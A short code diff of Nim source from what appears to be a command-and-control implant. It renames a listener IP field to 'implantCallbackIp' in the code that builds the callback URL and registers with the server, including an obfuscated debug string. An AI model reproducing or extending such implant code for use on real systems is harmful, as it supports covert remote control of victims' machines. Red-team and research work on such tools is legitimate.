@@ -16,7 +16,7 @@ type
         registered* : bool
         listenerType* : string
         listenerHost* : string
-        listenerIp* : string
+        implantCallbackIp* : string
         listenerPort* : string
         registerPath* : string
         reconnectPath* : string
@@ -37,7 +37,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
         if li.listenerHost != "":
             target = target & li.listenerHost
         else:
-            target = target & li.listenerIp & ":" & li.listenerPort
+            target = target & li.implantCallbackIp & ":" & li.listenerPort
         target = target & path
 
         # Get the workspace_uuid from the configuration
@@ -153,7 +153,7 @@ proc init*(li: var Listener) : void =
     # Register with the server
     when defined verbose:
         echo obf("DEBUG: Attempting to connect to ") & toLowerAscii(li.listenerType) & "://" & 
-             (if li.listenerHost != "": li.listenerHost else: li.listenerIp & ":" & li.listenerPort) & 
+             (if li.listenerHost != "": li.listenerHost else: li.implantCallbackIp & ":" & li.listenerPort) & 
              li.registerPath
 
     var res = doRequest(li, li.registerPath)
